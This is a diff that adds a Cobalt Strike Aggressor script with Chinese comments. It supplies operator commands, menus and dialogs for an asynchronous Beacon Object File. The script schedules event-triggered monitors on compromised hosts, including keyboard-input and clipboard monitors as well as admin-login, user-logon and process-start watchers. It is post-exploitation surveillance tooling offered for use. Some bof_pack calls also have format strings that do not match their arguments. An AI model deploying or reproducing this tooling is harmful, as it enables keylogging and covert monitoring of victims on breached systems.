@@ -1,0 +1,353 @@
+# Async BOF Aggressor Script
+# 为异步Beacon Object Files提供用户友好的界面
+
+# 定义事件类型常量
+global $EVENT_ADMIN_LOGIN = 0;
+global $EVENT_PROCESS_START = 1;
+global $EVENT_USER_LOGIN = 2;
+global $EVENT_NETWORK_ISOLATION = 3;
+global $EVENT_VPN_CONNECTION = 4;
+global $EVENT_WIFI_CONNECTION = 5;
+global $EVENT_TICKET_EXPIRATION = 6;
+global $EVENT_CLIPBOARD_COPY = 7;
+global $EVENT_KEYBOARD_INPUT = 8;
+global $EVENT_USER_LOGON = 9;
+
+# 定义命令常量
+global $CMD_ADD_TASK = 1;
+global $CMD_LIST_TASKS = 2;
+global $CMD_TRIGGER_EVENT = 3;
+global $CMD_CANCEL_TASK = 4;
+global $CMD_DELETE_TASK = 5;
+global $CMD_LOAD_TASKS = 6;
+
+# 注册别名
+alias async_bof {
+    btask($1, "正在加载异步BOF...");
+    bof_pack($1, "zi", $CMD_LOAD_TASKS, 0);
+    beacon_inline_execute($1, readbof("async_bof.o"), "go", $data);
+}
+
+alias async_bof_add_task {
+    local('$task_name $event_type $params $interval');
+    $task_name = $2;
+    $event_type = $3;
+    $params = $4;
+    $interval = $5;
+    
+    if ($task_name eq "" || $event_type eq "" || $params eq "" || $interval eq "") {
+        berror($1, "使用方法: async_bof_add_task <任务名称> <事件类型> <参数> <间隔>");
+        return;
+    }
+    
+    btask($1, "正在添加异步任务: " . $task_name);
+    bof_pack($1, "zizi", $CMD_ADD_TASK, $task_name, $event_type, $params, $interval);
+    beacon_inline_execute($1, readbof("async_bof.o"), "go", $data);
+}
+
+alias async_bof_list {
+    btask($1, "正在列出异步任务...");
+    bof_pack($1, "z", $CMD_LIST_TASKS);
+    beacon_inline_execute($1, readbof("async_bof.o"), "go", $data);
+}
+
+alias async_bof_cancel {
+    local('$task_id');
+    $task_id = $2;
+    
+    if ($task_id eq "") {
+        berror($1, "使用方法: async_bof_cancel <任务ID>");
+        return;
+    }
+    
+    btask($1, "正在取消任务: " . $task_id);
+    bof_pack($1, "zi", $CMD_CANCEL_TASK, $task_id);
+    beacon_inline_execute($1, readbof("async_bof.o"), "go", $data);
+}
+
+alias async_bof_delete {
+    local('$task_id');
+    $task_id = $2;
+    
+    if ($task_id eq "") {
+        berror($1, "使用方法: async_bof_delete <任务ID>");
+        return;
+    }
+    
+    btask($1, "正在删除任务: " . $task_id);
+    bof_pack($1, "zi", $CMD_DELETE_TASK, $task_id);
+    beacon_inline_execute($1, readbof("async_bof.o"), "go", $data);
+}
+
+alias async_bof_trigger {
+    local('$event_type $host');
+    $event_type = $2;
+    $host = $3;
+    
+    if ($event_type eq "" || $host eq "") {
+        berror($1, "使用方法: async_bof_trigger <事件类型> <主机>");
+        return;
+    }
+    
+    btask($1, "正在触发测试事件: " . $event_type . " 在 " . $host);
+    bof_pack($1, "ziz", $CMD_TRIGGER_EVENT, $event_type, $host);
+    beacon_inline_execute($1, readbof("async_bof.o"), "go", $data);
+}
+
+# 添加右键菜单
+popup beacon_bottom {
+    menu "异步BOF" {
+        # 子菜单：添加监控器
+        menu "添加监控器" {
+            item "管理员登录监控" {
+                local('$dialog');
+                $dialog = dialog("添加管理员登录监控", %(interval => "30"), &callback_add_admin_monitor);
+                dialog_description($dialog, "监控管理员登录事件");
+                drow_text($dialog, "interval", "检查间隔 (秒):");
+                dbutton_action($dialog, "添加");
+                dialog_show($dialog);
+            }
+            
+            item "进程启动监控" {
+                local('$dialog');
+                $dialog = dialog("添加进程启动监控", %(process => "", interval => "30"), &callback_add_process_monitor);
+                dialog_description($dialog, "监控特定进程启动");
+                drow_text($dialog, "process", "进程名:");
+                drow_text($dialog, "interval", "检查间隔 (秒):");
+                dbutton_action($dialog, "添加");
+                dialog_show($dialog);
+            }
+            
+            item "用户登录监控" {
+                local('$dialog');
+                $dialog = dialog("添加用户登录监控", %(username => "", interval => "30"), &callback_add_user_monitor);
+                dialog_description($dialog, "监控特定用户登录");
+                drow_text($dialog, "username", "用户名:");
+                drow_text($dialog, "interval", "检查间隔 (秒):");
+                dbutton_action($dialog, "添加");
+                dialog_show($dialog);
+            }
+            
+            item "网络隔离监控" {
+                local('$dialog');
+                $dialog = dialog("添加网络隔离监控", %(interface => "all", interval => "60"), &callback_add_network_monitor);
+                dialog_description($dialog, "监控网络连接断开");
+                drow_text($dialog, "interface", "网络接口:");
+                drow_text($dialog, "interval", "检查间隔 (秒):");
+                dbutton_action($dialog, "添加");
+                dialog_show($dialog);
+            }
+            
+            item "剪贴板监控" {
+                local('$dialog');
+                $dialog = dialog("添加剪贴板监控", %(text => "", interval => "10"), &callback_add_clipboard_monitor);
+                dialog_description($dialog, "监控剪贴板内容变化");
+                drow_text($dialog, "text", "监控文本:");
+                drow_text($dialog, "interval", "检查间隔 (秒):");
+                dbutton_action($dialog, "添加");
+                dialog_show($dialog);
+            }
+            
+            item "键盘监控" {
+                local('$dialog');
+                $dialog = dialog("添加键盘监控", %(keys => "", interval => "5"), &callback_add_keyboard_monitor);
+                dialog_description($dialog, "监控键盘输入");
+                drow_text($dialog, "keys", "监控按键:");
+                drow_text($dialog, "interval", "检查间隔 (秒):");
+                dbutton_action($dialog, "添加");
+                dialog_show($dialog);
+            }
+            
+            item "用户登录事件监控" {
+                local('$dialog');
+                $dialog = dialog("添加用户登录事件监控", %(username => "", interval => "30"), &callback_add_userlogon_monitor);
+                dialog_description($dialog, "监控用户登录事件");
+                drow_text($dialog, "username", "用户名:");
+                drow_text($dialog, "interval", "检查间隔 (秒):");
+                dbutton_action($dialog, "添加");
+                dialog_show($dialog);
+            }
+        }
+        
+        separator();
+        
+        item "列出任务" {
+            async_bof_list($1);
+        }
+        
+        item "取消任务" {
+            local('$dialog');
+            $dialog = dialog("取消任务", %(task_id => ""), &callback_cancel_task);
+            dialog_description($dialog, "取消指定的任务");
+            drow_text($dialog, "task_id", "任务ID:");
+            dbutton_action($dialog, "取消任务");
+            dialog_show($dialog);
+        }
+        
+        item "删除任务" {
+            local('$dialog');
+            $dialog = dialog("删除任务", %(task_id => ""), &callback_delete_task);
+            dialog_description($dialog, "删除指定的任务");
+            drow_text($dialog, "task_id", "任务ID:");
+            dbutton_action($dialog, "删除任务");
+            dialog_show($dialog);
+        }
+        
+        separator();
+        
+        item "加载任务" {
+            async_bof($1);
+        }
+        
+        separator();
+        
+        # 测试功能
+        menu "测试事件" {
+            item "管理员登录事件" {
+                async_bof_trigger($1, $EVENT_ADMIN_LOGIN, beacon_info($1, "computer"));
+            }
+            
+            item "进程启动事件" {
+                async_bof_trigger($1, $EVENT_PROCESS_START, beacon_info($1, "computer"));
+            }
+            
+            item "用户登录事件" {
+                async_bof_trigger($1, $EVENT_USER_LOGIN, beacon_info($1, "computer"));
+            }
+            
+            item "WiFi连接事件" {
+                async_bof_trigger($1, $EVENT_WIFI_CONNECTION, beacon_info($1, "computer"));
+            }
+        }
+    }
+}
+
+# 回调函数
+sub callback_add_admin_monitor {
+    local('$bid $result');
+    $bid = $3['$bid'];
+    $result = $3;
+    
+    async_bof_add_task($bid, "AdminMonitor_" . rand(1000), $EVENT_ADMIN_LOGIN, "admin", $result['interval']);
+}
+
+sub callback_add_process_monitor {
+    local('$bid $result');
+    $bid = $3['$bid'];
+    $result = $3;
+    
+    if ($result['process'] eq "") {
+        berror($bid, "进程名不能为空");
+        return;
+    }
+    
+    async_bof_add_task($bid, "ProcessMonitor_" . rand(1000), $EVENT_PROCESS_START, $result['process'], $result['interval']);
+}
+
+sub callback_add_user_monitor {
+    local('$bid $result');
+    $bid = $3['$bid'];
+    $result = $3;
+    
+    if ($result['username'] eq "") {
+        berror($bid, "用户名不能为空");
+        return;
+    }
+    
+    async_bof_add_task($bid, "UserMonitor_" . rand(1000), $EVENT_USER_LOGIN, $result['username'], $result['interval']);
+}
+
+sub callback_add_network_monitor {
+    local('$bid $result');
+    $bid = $3['$bid'];
+    $result = $3;
+    
+    async_bof_add_task($bid, "NetworkMonitor_" . rand(1000), $EVENT_NETWORK_ISOLATION, $result['interface'], $result['interval']);
+}
+
+sub callback_add_clipboard_monitor {
+    local('$bid $result');
+    $bid = $3['$bid'];
+    $result = $3;
+    
+    if ($result['text'] eq "") {
+        berror($bid, "监控文本不能为空");
+        return;
+    }
+    
+    async_bof_add_task($bid, "ClipboardMonitor_" . rand(1000), $EVENT_CLIPBOARD_COPY, $result['text'], $result['interval']);
+}
+
+sub callback_add_keyboard_monitor {
+    local('$bid $result');
+    $bid = $3['$bid'];
+    $result = $3;
+    
+    if ($result['keys'] eq "") {
+        berror($bid, "监控按键不能为空");
+        return;
+    }
+    
+    async_bof_add_task($bid, "KeyboardMonitor_" . rand(1000), $EVENT_KEYBOARD_INPUT, $result['keys'], $result['interval']);
+}
+
+sub callback_add_userlogon_monitor {
+    local('$bid $result');
+    $bid = $3['$bid'];
+    $result = $3;
+    
+    if ($result['username'] eq "") {
+        berror($bid, "用户名不能为空");
+        return;
+    }
+    
+    async_bof_add_task($bid, "UserLogonMonitor_" . rand(1000), $EVENT_USER_LOGON, $result['username'], $result['interval']);
+}
+
+sub callback_cancel_task {
+    local('$bid $result');
+    $bid = $3['$bid'];
+    $result = $3;
+    
+    if ($result['task_id'] eq "") {
+        berror($bid, "任务ID不能为空");
+        return;
+    }
+    
+    async_bof_cancel($bid, $result['task_id']);
+}
+
+sub callback_delete_task {
+    local('$bid $result');
+    $bid = $3['$bid'];
+    $result = $3;
+    
+    if ($result['task_id'] eq "") {
+        berror($bid, "任务ID不能为空");
+        return;
+    }
+    
+    async_bof_delete($bid, $result['task_id']);
+}
+
+# 帮助信息
+beacon_command_register("async_bof", "加载和初始化异步BOF", "使用方法: async_bof");
+beacon_command_register("async_bof_add_task", "添加异步监控任务", "使用方法: async_bof_add_task <名称> <类型> <参数> <间隔>");
+beacon_command_register("async_bof_list", "列出所有异步任务", "使用方法: async_bof_list");
+beacon_command_register("async_bof_cancel", "取消异步任务", "使用方法: async_bof_cancel <任务ID>");
+beacon_command_register("async_bof_delete", "删除异步任务", "使用方法: async_bof_delete <任务ID>");
+beacon_command_register("async_bof_trigger", "触发测试事件", "使用方法: async_bof_trigger <事件类型> <主机>");
+
+println("[*] 异步BOF Aggressor脚本加载成功");
+println("[*] 事件类型:");
+println("    0 - 管理员登录");
+println("    1 - 进程启动");
+println("    2 - 用户登录");
+println("    3 - 网络隔离");
+println("    4 - VPN连接");
+println("    5 - WiFi连接");
+println("    6 - 票据过期");
+println("    7 - 剪贴板复制");
+println("    8 - 键盘输入");
+println("    9 - 用户登录事件");
+println("[*] 使用右键菜单 '异步BOF' 进行图形界面操作");
